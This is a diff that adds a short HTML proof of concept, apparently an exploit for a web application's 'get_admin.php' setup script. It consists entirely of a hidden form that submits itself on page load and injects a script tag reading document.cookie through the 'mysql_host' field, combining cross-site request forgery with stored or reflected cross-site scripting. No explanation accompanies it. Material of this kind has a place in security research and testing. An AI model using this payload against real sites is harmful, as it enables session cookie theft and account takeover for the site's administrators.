@@ -1,0 +1,10 @@
+&lt;form method=&quot;POST&quot; action=&quot;http://www.example.com/misc/get_admin.php&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mysql_host&quot; value=&quot;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;db_name&quot; value=&quot;X&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mysql_user&quot; value=&quot;X&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mysql_pass&quot; value=&quot;X&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;connect&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
